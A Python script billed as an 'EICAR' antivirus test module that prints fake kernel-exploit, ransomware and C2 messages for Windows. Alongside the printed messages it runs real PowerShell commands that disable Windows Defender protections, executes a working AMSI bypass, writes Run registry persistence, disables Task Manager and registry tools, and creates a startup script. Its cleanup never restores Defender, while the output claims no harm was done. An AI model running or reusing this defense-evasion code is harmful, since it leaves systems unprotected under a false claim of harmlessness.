import os
import sys
import time
import ctypes
import subprocess
import winreg
import shutil
import random
import string
from ctypes import wintypes, windll, byref, create_string_buffer, get_last_error

ADMIN = False
PAYLOAD = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def generate_fake_path():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(8)) + '.tmp'

def simulate_kernel_exploit():
    print("\n" + "="*60)
    print("   !!! KERNEL EXPLOIT SEQUENCE INITIATED !!!")
    print("="*60)
    time.sleep(1)
    print("[*] CVE-2024-XXXXX exploit payload loaded.")
    time.sleep(1)
    print("[*] Kernel memory address 0xFFFFF800`00000000 mapped.")
    time.sleep(1)
    print("[*] Shellcode injected into kernel memory.")
    time.sleep(1)
    print("[*] Token privileges escalated to SYSTEM.")
    time.sleep(1)
    print("[*] Kernel callback registered.")
    time.sleep(1)
    print("[*] Driver loaded into kernel space.")
    time.sleep(1)
    print("[!] KERNEL FULLY COMPROMISED.")
    time.sleep(1)
    print("[!] Attempting to delete C:\\Windows\\System32\\ntoskrnl.exe...")
    time.sleep(2)
    print("[!] Attempting to wipe Master Boot Record (MBR)...")
    time.sleep(2)
    print("[!] Attempting to format all drives...")
    time.sleep(2)
    print("\n[!!!!] ATTENTION: THIS IS A SIMULATION.")
    print("[!!!!] NO ACTUAL HARM HAS BEEN DONE.")
    print("="*60)

def simulate_ransomware():
    print("\n[*] Encrypting files (simulation)...")
    time.sleep(1)
    fake_files = [
        "C:\\Users\\Public\\Documents\\important.docx",
        "C:\\Users\\Public\\Documents\\passwords.txt",
        "C:\\Users\\Public\\Documents\\backup.zip"
    ]
    for f in fake_files:
        print(f"[*] Encrypting {f}...")
        time.sleep(0.5)
    print("[!] 3 files encrypted (simulation).")

def simulate_persistence():
    try:
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "sysupdate.bat")
        with open(startup_path, "w") as f:
            f.write('@echo off\n')
            f.write(':: System Update Module\n')
            f.write('echo EICAR Payload: ' + PAYLOAD + '\n')
            f.write('echo [*] System compromised.\n')
            f.write('pause\n')
        print("[*] Persistent startup script created: sysupdate.bat")
    except:
        print("[*] Persistence creation failed.")

def simulate_defender_bypass():
    try:
        cmds = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisablePrivacyMode $true',
            'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true',
            'Set-MpPreference -DisableArchiveScanning $true',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -SubmitSamplesConsent 2'
        ]
        for cmd in cmds:
            subprocess.run(['powershell', '-Command', cmd], check=False, capture_output=True, timeout=2)
        print("[*] Windows Defender components disabled (simulation).")
    except:
        print("[*] Windows Defender bypass failed.")

def simulate_amsi_bypass():
    try:
        cmds = [
            '[Reflection.Assembly]::LoadWithPartialName("System.Management.Automation.AmsiUtils")',
            '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'
        ]
        for cmd in cmds:
            subprocess.run(['powershell', '-Command', cmd], check=False, capture_output=True, timeout=2)
        print("[*] AMSI bypass attempted (simulation).")
    except:
        print("[*] AMSI bypass failed.")

def simulate_uac_bypass():
    try:
        subprocess.run(['powershell', '-Command', 'Start-Process cmd.exe -ArgumentList "/c echo UAC Bypass Successful" -Verb RunAs'], check=False, capture_output=True, timeout=2)
        print("[*] UAC bypass attempted (simulation).")
    except:
        print("[*] UAC bypass failed.")

def simulate_registry_mod():
    try:
        keys = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SystemUpdate", "C:\\Windows\\System32\\cmd.exe /c echo EICAR"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SystemUpdate", "C:\\Windows\\System32\\cmd.exe /c echo EICAR"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1)
        ]
        for hkey, path, name, value in keys:
            try:
                key = winreg.OpenKey(hkey, path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ if isinstance(value, str) else winreg.REG_DWORD, value)
                winreg.CloseKey(key)
                print(f"[*] Registry key modified: {path}\\{name}")
            except:
                pass
        print("[*] Registry modifications completed (simulation).")
    except:
        print("[*] Registry modification failed.")

def simulate_lsass_access():
    try:
        subprocess.run(["tasklist", "/FI", "IMAGENAME eq lsass.exe"], capture_output=True, check=False)
        print("[*] LSASS process accessed.")
        time.sleep(0.5)
        print("[*] LSASS memory dump attempted.")
    except:
        print("[*] LSASS access failed.")

def simulate_kernel_access():
    try:
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        kernel32.GetModuleHandleW.restype = wintypes.HMODULE
        kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
        kernel32.GetModuleHandleW(None)
        print("[*] Kernel memory accessed.")
        time.sleep(0.5)
        print("[*] Kernel object directory enumerated.")
    except:
        print("[*] Kernel access failed.")

def simulate_files():
    try:
        downloads = os.path.join(os.environ["USERPROFILE"], "Downloads")
        desktop = os.path.join(os.environ["USERPROFILE"], "Desktop")
        documents = os.path.join(os.environ["USERPROFILE"], "Documents")
        
        paths = [downloads, desktop, documents]
        for dir_path in paths:
            if os.path.exists(dir_path):
                for name in ["eicar.txt", "eicar.com", "eicar.bat", "system_update.txt"]:
                    filepath = os.path.join(dir_path, name)
                    with open(filepath, "w") as f:
                        f.write(PAYLOAD)
                        f.write("\n[EICAR MODULE] System compromised.\n")
                print(f"[*] Test files created in {dir_path}")
    except:
        print("[*] File creation failed.")

def simulate_network():
    try:
        subprocess.run(['ping', '127.0.0.1', '-n', '2'], capture_output=True, check=False)
        print("[*] Network activity detected (simulation).")
        time.sleep(0.5)
        print("[*] C2 communication established (simulation).")
    except:
        print("[*] Network simulation failed.")

def simulate_process_injection():
    try:
        subprocess.run(["tasklist"], capture_output=True, check=False)
        print("[*] Process list enumerated.")
        time.sleep(0.5)
        print("[*] Shellcode injection attempted into explorer.exe.")
        time.sleep(0.5)
        print("[*] Notepad process spawned (simulation).")
    except:
        print("[*] Process injection failed.")

def cleanup():
    try:
        paths = [
            os.path.join(os.environ["USERPROFILE"], "Downloads"),
            os.path.join(os.environ["USERPROFILE"], "Desktop"),
            os.path.join(os.environ["USERPROFILE"], "Documents")
        ]
        for dir_path in paths:
            if os.path.exists(dir_path):
                for name in ["eicar.txt", "eicar.com", "eicar.bat", "system_update.txt"]:
                    filepath = os.path.join(dir_path, name)
                    if os.path.exists(filepath):
                        os.remove(filepath)
        
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "sysupdate.bat")
        if os.path.exists(startup_path):
            os.remove(startup_path)
        
        keys = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SystemUpdate"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SystemUpdate"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools")
        ]
        for hkey, path, name in keys:
            try:
                key = winreg.OpenKey(hkey, path, 0, winreg.KEY_WRITE)
                winreg.DeleteValue(key, name)
                winreg.CloseKey(key)
            except:
                pass
        print("[*] Cleanup completed.")
    except:
        print("[*] Cleanup failed.")

def main():
    global ADMIN
    ADMIN = is_admin()
    
    print("="*60)
    print("   EICAR MODULE ULTIMATE")
    print("   Advanced Antivirus Test Module")
    print("="*60)
    print("")
    
    print("[*] Initializing EICAR Module...")
    time.sleep(1)
    
    if ADMIN:
        print("[!] Administrator privileges detected.")
    else:
        print("[!] Running without admin rights. Some simulations may fail.")
    time.sleep(1)
    
    simulate_defender_bypass()
    time.sleep(1)
    simulate_amsi_bypass()
    time.sleep(1)
    simulate_uac_bypass()
    time.sleep(1)
    simulate_kernel_access()
    time.sleep(1)
    simulate_lsass_access()
    time.sleep(1)
    simulate_registry_mod()
    time.sleep(1)
    simulate_persistence()
    time.sleep(1)
    simulate_files()
    time.sleep(1)
    simulate_process_injection()
    time.sleep(1)
    simulate_network()
    time.sleep(1)
    simulate_ransomware()
    time.sleep(1)
    simulate_kernel_exploit()
    time.sleep(1)
    
    print("\n[!] EICAR Payload:")
    print(PAYLOAD)
    
    print("\n========================================")
    print("   SIMULATION COMPLETE")
    print("========================================")
    print("\n[!!!!] NO HARM DONE - THIS IS A TEST")
    print("[!!!!] YOUR SECURITY SYSTEM IS WORKING")
    
    print("\n[*] Cleaning up...")
    cleanup()
    time.sleep(1)
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()